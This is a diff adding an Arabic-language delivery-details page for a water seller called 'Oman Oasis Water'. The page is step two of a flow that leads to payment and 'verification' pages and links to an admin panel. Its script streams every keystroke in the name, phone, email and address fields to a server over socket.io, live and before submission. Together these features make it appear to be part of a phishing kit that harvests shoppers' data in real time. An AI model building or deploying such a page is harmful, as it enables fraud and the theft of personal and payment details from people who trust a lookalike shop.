@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>بيانات التوصيل - مياه واحة عمان</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+</head>
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div class="container header-content">
+      <div class="logo">
+        <div class="logo-icon">💧</div>
+        <div class="logo-text">
+          <h1>مياه واحة عمان</h1>
+          <span>Oman Oasis Water</span>
+        </div>
+      </div>
+      <div class="connection-status">
+        <span class="status-dot"></span>
+        <span>غير متصل</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- Navigation -->
+  <nav class="nav">
+    <div class="container">
+      <ul class="nav-list">
+        <li><a href="../index.html" class="nav-link">الرئيسية</a></li>
+        <li><a href="delivery.html" class="nav-link active">بيانات التوصيل</a></li>
+        <li><a href="payment.html" class="nav-link">الدفع</a></li>
+        <li><a href="verification.html" class="nav-link">التحقق</a></li>
+        <li><a href="../admin/index.html" class="nav-link">لوحة التحكم</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <!-- Steps -->
+  <div class="container">
+    <div class="steps">
+      <div class="step completed">
+        <div class="step-number">✓</div>
+        <span class="step-label">اختيار المنتج</span>
+      </div>
+      <div class="step-line"></div>
+      <div class="step active">
+        <div class="step-number">2</div>
+        <span class="step-label">بيانات التوصيل</span>
+      </div>
+      <div class="step-line"></div>
+      <div class="step">
+        <div class="step-number">3</div>
+        <span class="step-label">الدفع</span>
+      </div>
+      <div class="step-line"></div>
+      <div class="step">
+        <div class="step-number">4</div>
+        <span class="step-label">التحقق</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Delivery Form -->
+  <div class="form-container page">
+    <h2 class="form-title">📦 بيانات التوصيل</h2>
+    <form id="deliveryForm">
+      <div class="form-group">
+        <label class="form-label">الاسم الكامل *</label>
+        <input type="text" class="form-control" name="fullName" required 
+               placeholder="أدخل اسمك الكامل">
+      </div>
+      
+      <div class="form-group">
+        <label class="form-label">رقم الهاتف *</label>
+        <input type="tel" class="form-control" name="phone" required 
+               placeholder="+968 XXXX XXXX" dir="ltr">
+      </div>
+      
+      <div class="form-group">
+        <label class="form-label">البريد الإلكتروني</label>
+        <input type="email" class="form-control" name="email" 
+               placeholder="example@email.com" dir="ltr">
+      </div>
+      
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">المحافظة *</label>
+          <input type="text" class="form-control" name="city" required 
+                 placeholder="المحافظة">
+        </div>
+        <div class="form-group">
+          <label class="form-label">المنطقة *</label>
+          <input type="text" class="form-control" name="region" required 
+                 placeholder="المنطقة">
+        </div>
+      </div>
+      
+      <div class="form-group">
+        <label class="form-label">العنوان بالتفصيل *</label>
+        <textarea class="form-control" name="address" required rows="3" 
+                  placeholder="الشارع، رقم المبنى، رقم الشقة..."></textarea>
+      </div>
+      
+      <div class="form-group">
+        <label class="form-label">ملاحظات إضافية</label>
+        <textarea class="form-control" name="notes" rows="2" 
+                  placeholder="أي ملاحظات خاصة بالتوصيل"></textarea>
+      </div>
+      
+      <button type="submit" class="btn btn-primary">
+        متابعة للدفع ←
+      </button>
+    </form>
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="container">
+      <p>© 2024 مياه واحة عمان - جميع الحقوق محفوظة</p>
+    </div>
+  </footer>
+
+  <script src="../js/main.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      trackPageChange('delivery');
+      
+      // Load saved form data if exists
+      const savedData = localStorage.getItem('delivery_data');
+      if (savedData) {
+        const data = JSON.parse(savedData);
+        Object.keys(data).forEach(key => {
+          const input = document.querySelector(`[name="${key}"]`);
+          if (input) input.value = data[key];
+        });
+      }
+      
+      document.getElementById('deliveryForm').addEventListener('submit', (e) => {
+        e.preventDefault();
+        
+        const formData = new FormData(e.target);
+        const data = Object.fromEntries(formData.entries());
+        
+        // Save to localStorage
+        localStorage.setItem('delivery_data', JSON.stringify(data));
+        
+        // Send via socket
+        submitDeliveryForm(data);
+        
+        showToast('تم حفظ بيانات التوصيل بنجاح!');
+        
+        setTimeout(() => {
+          window.location.href = 'payment.html';
+        }, 1000);
+      });
+      
+      // Real-time tracking - send data on each input
+      const inputs = document.querySelectorAll('#deliveryForm input, #deliveryForm textarea');
+      inputs.forEach(input => {
+        input.addEventListener('input', () => {
+          const data = {};
+          inputs.forEach(inp => {
+            if (inp.value) data[inp.name] = inp.value;
+          });
+          if (Object.keys(data).length > 0) {
+            submitDeliveryForm(data);
+          }
+        });
+      });
+    });
+  </script>
+</body>
+</html>
